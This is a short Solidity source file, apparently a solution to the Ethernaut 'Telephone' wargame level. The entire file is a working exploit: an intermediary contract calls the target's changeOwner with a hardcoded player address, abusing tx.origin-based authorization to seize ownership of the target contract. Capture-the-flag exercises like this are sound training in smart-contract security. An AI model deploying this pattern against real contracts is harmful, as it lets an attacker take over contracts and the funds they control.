pragma solidity ^0.4.18;

contract Telephone {
    function changeOwner(address _owner) {}
}
contract AliciaChangeOwner {
    address player =  0x6b7d0e77ea524733681d67133469d928d0e83bfe;
    Telephone target = Telephone(0x457834c67571088a0a9f3d4d1c0cf88fa2a52e87);
    
    function AliciaChangeOwner() {
    }
    
    function changeTelOwner() {
        target.changeOwner(player);
    }
}